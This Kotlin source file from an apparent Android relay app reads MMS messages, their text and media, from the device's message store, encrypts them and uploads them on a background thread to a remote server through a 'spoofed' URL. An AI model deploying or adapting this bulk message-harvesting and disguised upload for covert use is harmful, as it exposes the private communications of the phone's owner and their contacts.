package com.gafam.relay

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import android.util.Log
import androidx.core.content.ContextCompat
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicLong
import kotlin.concurrent.thread

/**
 * Pushes MMS messages (text + media parts) from the device provider to the VPC.
 *
 * Strategy: read the MMS already downloaded by the system/default SMS app from
 * `content://mms` and `content://mms/part`, then upload each message with its
 * parts (media as base64) to `/api/auth/mms/sync`. No WAP-PUSH parsing needed —
 * the default SMS app handles the download, we relay the result.
 *
 * RCS media never lands in this provider: it stays inside Google Messages
 * (see manifest 16). Only carrier MMS is covered here.
 */
object MmsSync {
    private const val TAG = "GAFAM_Relay"
    private const val MAX_MESSAGES = 100
    private const val MIN_INTERVAL_MS = 5 * 60 * 1000L // 5 min
    private const val MAX_PART_BYTES = 2 * 1024 * 1024 // skip parts > 2 MB

    private val syncing = AtomicBoolean(false)
    private val lastSyncAt = AtomicLong(0)

    fun syncAsync(context: Context, force: Boolean = false) {
        thread(name = "gafam-mms-sync", isDaemon = true) {
            sync(context.applicationContext, force)
        }
    }

    fun sync(context: Context, force: Boolean = false) {
        if (!force) {
            val last = lastSyncAt.get()
            if (last > 0 && System.currentTimeMillis() - last < MIN_INTERVAL_MS) return
        }
        if (!syncing.compareAndSet(false, true)) return
        try {
            doSync(context)
            lastSyncAt.set(System.currentTimeMillis())
        } catch (e: Exception) {
            Log.e(TAG, "MMS sync failed", e)
            LogShipper.event(context, "E", "mms_sync", "MMS sync failed: ${e.message}")
        } finally {
            syncing.set(false)
        }
    }

    private fun doSync(context: Context) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED
        ) {
            Log.w(TAG, "READ_SMS missing — skip MMS sync")
            return
        }

        val prefs = context.getSharedPreferences("GAFAM_PREFS", Context.MODE_PRIVATE)
        val apiUrl = prefs.getString("apiUrl", null) ?: return
        val jwtSecret = prefs.getString("jwtSecret", null) ?: return

        val messages = JSONArray()

        val cursor = context.contentResolver.query(
            Uri.parse("content://mms"),
            arrayOf("_id", "date", "msg_box"),
            "msg_box IN (1,2)",
            null,
            "date DESC LIMIT $MAX_MESSAGES"
        ) ?: return

        val mmsRows = mutableListOf<Triple<Long, Long, Int>>() // (id, date, msg_box)
        cursor.use {
            val idIdx = it.getColumnIndex("_id")
            val dateIdx = it.getColumnIndex("date")
            val boxIdx = it.getColumnIndex("msg_box")
            while (it.moveToNext()) {
                mmsRows.add(Triple(it.getLong(idIdx), it.getLong(dateIdx), it.getInt(boxIdx)))
            }
        }

        for ((mmsId, dateSec, msgBox) in mmsRows) {
            val address = readAddress(context, mmsId, msgBox) ?: continue
            val parts = readParts(context, mmsId)
            if (parts.length() == 0) continue

            messages.put(JSONObject().apply {
                put("address", address)
                put("timestamp", dateSec * 1000) // MMS dates are in seconds
                put("type", msgBox) // 1=inbox, 2=sent
                put("parts", parts)
            })
        }

        if (messages.length() == 0) {
            Log.d(TAG, "No MMS to sync")
            return
        }

        val plaintext = JSONObject().put("messages", messages).toString().toByteArray(Charsets.UTF_8)
        val digest = java.security.MessageDigest.getInstance("SHA-256")
        val keyBytes = digest.digest(jwtSecret.toByteArray(Charsets.UTF_8))
        val secretKey = javax.crypto.spec.SecretKeySpec(keyBytes, "AES")
        val cipher = javax.crypto.Cipher.getInstance("AES/GCM/NoPadding")
        val iv = ByteArray(12)
        java.security.SecureRandom().nextBytes(iv)
        cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, secretKey, javax.crypto.spec.GCMParameterSpec(128, iv))
        val ciphertext = cipher.doFinal(plaintext)

        val encryptedPayload = JSONObject().apply {
            put("encrypted_data", android.util.Base64.encodeToString(ciphertext, android.util.Base64.NO_WRAP))
            put("iv", android.util.Base64.encodeToString(iv, android.util.Base64.NO_WRAP))
        }

        val client = ApiClient.getClient(context) ?: return
        val spoofedUrl = ApiClient.getSpoofedUrl(apiUrl, "/api/auth/mms/sync")
        val request = Request.Builder()
            .url(spoofedUrl)
            .post(encryptedPayload.toString().toRequestBody("application/json".toMediaType()))
            .addHeader("Authorization", "Bearer $jwtSecret")
            .build()

        val response = client.newCall(request).execute()
        val code = response.code
        response.close()
        if (code in 200..299) {
            Log.d(TAG, "MMS synced (${messages.length()} msgs)")
            LogShipper.event(context, "I", "mms_sync", "Synced ${messages.length()} MMS to VPC")
        } else {
            Log.w(TAG, "MMS sync HTTP $code")
            LogShipper.event(context, "W", "mms_sync", "MMS sync HTTP $code")
        }
    }

    /** Reads the peer address of an MMS from content://mms/addr (type 137 = from, 151 = to). */
    private fun readAddress(context: Context, mmsId: Long, msgBox: Int): String? {
        val wantedType = if (msgBox == 1) "137" else "151"
        val cursor = context.contentResolver.query(
            Uri.parse("content://mms/$mmsId/addr"),
            arrayOf("address", "type"),
            null, null, null
        ) ?: return null
        cursor.use {
            val addrIdx = it.getColumnIndex("address")
            val typeIdx = it.getColumnIndex("type")
            while (it.moveToNext()) {
                val type = it.getString(typeIdx)
                val addr = it.getString(addrIdx)
                if (type == wantedType && !addr.isNullOrBlank() && addr != "insert-address-token") {
                    return addr
                }
            }
        }
        return null
    }

    /** Reads all parts of an MMS: text inline, media as base64 (size-capped). */
    private fun readParts(context: Context, mmsId: Long): JSONArray {
        val parts = JSONArray()
        val cursor = context.contentResolver.query(
            Uri.parse("content://mms/part"),
            arrayOf("_id", "ct", "name", "text"),
            "mid = ?",
            arrayOf(mmsId.toString()),
            null
        ) ?: return parts

        cursor.use {
            val idIdx = it.getColumnIndex("_id")
            val ctIdx = it.getColumnIndex("ct")
            val nameIdx = it.getColumnIndex("name")
            val textIdx = it.getColumnIndex("text")
            while (it.moveToNext()) {
                val partId = it.getLong(idIdx)
                val contentType = it.getString(ctIdx) ?: continue
                val name = it.getString(nameIdx) ?: ""

                if (contentType == "text/plain") {
                    val text = it.getString(textIdx) ?: ""
                    if (text.isNotBlank()) {
                        parts.put(JSONObject().apply {
                            put("content_type", contentType)
                            put("name", name)
                            put("text", text)
                        })
                    }
                } else if (contentType.startsWith("image/") || contentType.startsWith("video/") || contentType.startsWith("audio/")) {
                    val data = readPartBytes(context, partId) ?: continue
                    parts.put(JSONObject().apply {
                        put("content_type", contentType)
                        put("name", name)
                        put("data_base64", android.util.Base64.encodeToString(data, android.util.Base64.NO_WRAP))
                    })
                }
                // application/smil and unknown types are skipped
            }
        }
        return parts
    }

    private fun readPartBytes(context: Context, partId: Long): ByteArray? {
        return try {
            context.contentResolver.openInputStream(Uri.parse("content://mms/part/$partId"))?.use { stream ->
                val bytes = stream.readBytes()
                if (bytes.size > MAX_PART_BYTES) null else bytes
            }
        } catch (e: Exception) {
            Log.w(TAG, "Cannot read MMS part $partId: ${e.message}")
            null
        }
    }
}
